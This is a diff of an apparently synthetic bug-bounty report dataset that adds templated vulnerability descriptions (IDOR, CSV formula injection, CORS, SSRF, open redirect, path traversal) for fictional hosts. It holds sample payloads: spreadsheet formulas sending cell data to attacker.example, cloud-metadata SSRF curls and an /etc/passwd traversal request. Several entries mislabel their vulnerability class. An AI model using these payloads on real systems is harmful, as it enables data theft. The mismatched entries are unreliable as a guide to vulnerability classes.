+      "description": "Appointments endpoint uses sequential IDs and only checks authentication, not ownership.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://api.eichenwald-digital.foo/api/appointments/`\n- Preconditions: authenticated user: citizen; app version: API 1.8\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /api/appointments/5541 -> own appointment.\n- GET /api/appointments/5542 -> other user's appointment.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -955,7 +962,8 @@
           "offset": "2d 6h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "Values starting with '=' become formulas when opened in spreadsheet apps.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://portal.eichenwald-digital.foo/export`\n- Preconditions: authenticated user: civil servant; app version: Portal 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Set last name to '=IMPORTXML(\"https://evil.foo\",\"//a\")' and export.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -1100,7 +1108,8 @@
           "offset": "9d 7h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "Internal endpoints visible on /docs without authentication.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://api.eichenwald-digital.foo/docs`\n- Preconditions: authenticated user: unauthenticated; app version: API 1.8\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /docs -> 200 includes /admin routes.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -1233,7 +1242,8 @@
           "offset": "8d 16h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "Metrics endpoint accessible without auth; labels include partial SSNs in test data.\n\n### Technical analysis\n- Vulnerability class: **Sensitive Metrics Exposure**\n- Affected target: `https://api.eichenwald-digital.foo/metrics`\n- Preconditions: authenticated user: unauthenticated; app version: API 1.8\n\n```text\n# Example Prometheus metric with PII\nhttp_requests_total{user_id=\"123\"} 42\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics -> 200; contains citizen_id labels.\n\n### Recommendations\n- Remove PII from metric labels; gate `/metrics` behind auth.\n- Provide a redacted public metrics endpoint if needed.\n"
     },
     "triager": {
       "status": "accepted",
@@ -1369,7 +1379,8 @@
           "offset": "6d 1h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://portal.eichenwald-digital.foo/console/queue`\n- Preconditions: authenticated user: radiologist; app version: Console 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -1485,7 +1496,8 @@
           "offset": "3d 10h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://api.eichenwald-digital.foo/export?type=records`\n- Preconditions: authenticated user: citizen; app version: Auth 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -1576,7 +1588,8 @@
           "offset": "3d 8h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://api.eichenwald-digital.foo/export?type=records`\n- Preconditions: authenticated user: admin; app version: API 2.3\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -1744,7 +1757,8 @@
           "offset": "8d 18h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://portal.eichenwald-digital.foo/admin/queue`\n- Preconditions: authenticated user: authenticated user; app version: Console 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -1880,7 +1894,8 @@
           "offset": "1d 11h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://api.eichenwald-digital.foo/export`\n- Preconditions: authenticated user: admin; app version: Mobile 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -2032,7 +2047,8 @@
           "offset": "3d 5h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://portal.eichenwald-digital.foo/admin/items`\n- Preconditions: authenticated user: admin; app version: Mobile 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -2171,7 +2187,8 @@
           "offset": "4d 10h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://api.eichenwald-digital.foo/v2/me`\n- Preconditions: authenticated user: admin; app version: Mobile 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -2279,7 +2296,8 @@
           "offset": "2d 7h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://api.eichenwald-digital.foo/export`\n- Preconditions: authenticated user: support agent; app version: API v2\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -2391,7 +2409,8 @@
           "offset": "5d 20h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://api.eichenwald-digital.foo/api/import`\n- Preconditions: authenticated user: support agent; app version: API 2.3\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -2473,7 +2492,8 @@
           "offset": "20h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://portal.eichenwald-digital.foo/api/v2/documents/`\n- Preconditions: authenticated user: citizen; app version: Web 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -2633,7 +2653,8 @@
           "offset": "7d 16h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://portal.eichenwald-digital.foo/v2/me`\n- Preconditions: authenticated user: support agent; app version: API 2.3\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -2730,7 +2751,8 @@
           "offset": "0h",
           "message": "Initial submission with PoC and reproduction steps."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://portal.eichenwald-digital.foo/metrics`\n- Preconditions: authenticated user: support agent; app version: API 2.3\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -2887,7 +2909,8 @@
           "offset": "7d 14h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://api.eichenwald-digital.foo/metrics`\n- Preconditions: authenticated user: radiologist; app version: Mobile 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -3027,7 +3050,8 @@
           "offset": "6d 16h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://portal.eichenwald-digital.foo/fetch`\n- Preconditions: authenticated user: authenticated user; app version: Web 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -3158,7 +3182,8 @@
           "offset": "16h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://api.eichenwald-digital.foo/import`\n- Preconditions: authenticated user: citizen; app version: Console 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -3306,7 +3331,8 @@
           "offset": "4d 10h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://portal.eichenwald-digital.foo/export`\n- Preconditions: authenticated user: unauthenticated; app version: API v2\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -3438,7 +3464,8 @@
           "offset": "5d 4h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://api.eichenwald-digital.foo/export?type=records`\n- Preconditions: authenticated user: unauthenticated; app version: Portal 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -3557,7 +3584,8 @@
           "offset": "2d 2h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://api.eichenwald-digital.foo/api/me`\n- Preconditions: authenticated user: authenticated user; app version: Console 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -3689,7 +3717,8 @@
           "offset": "1d 16h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://portal.eichenwald-digital.foo/api/me`\n- Preconditions: authenticated user: authenticated user; app version: Web 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -3802,7 +3831,8 @@
           "offset": "2d 18h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://api.eichenwald-digital.foo/metrics`\n- Preconditions: authenticated user: authenticated user; app version: Portal 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -3917,7 +3947,8 @@
           "offset": "2d 16h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://portal.eichenwald-digital.foo/api/v2/documents/`\n- Preconditions: authenticated user: citizen; app version: Auth 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -4049,7 +4080,8 @@
           "offset": "19h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://portal.eichenwald-digital.foo/api/v2/documents/`\n- Preconditions: authenticated user: admin; app version: Service 1.8\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -4205,7 +4237,8 @@
           "offset": "4d 3h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://open-data.eichenwald-digital.foo/export`\n- Preconditions: authenticated user: admin; app version: Portal 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -4341,7 +4374,8 @@
           "offset": "7d 1h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://open-data.eichenwald-digital.foo/auth/callback?next=https://evil.foo`\n- Preconditions: authenticated user: radiologist; app version: Portal 2025.09\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -4436,7 +4470,8 @@
           "offset": "1d 19h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://open-data.eichenwald-digital.foo/export?type=records`\n- Preconditions: authenticated user: authenticated user; app version: Portal 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -4602,7 +4637,8 @@
           "offset": "5d 22h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://www.eichenwald-digital.foo/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: citizen; app version: API v2\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -4729,7 +4765,8 @@
           "offset": "0h",
           "message": "Initial report filed with screenshots and logs."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://open-data.eichenwald-digital.foo/admin/queue`\n- Preconditions: authenticated user: support agent; app version: Auth 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -4853,7 +4890,8 @@
           "offset": "7d 10h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
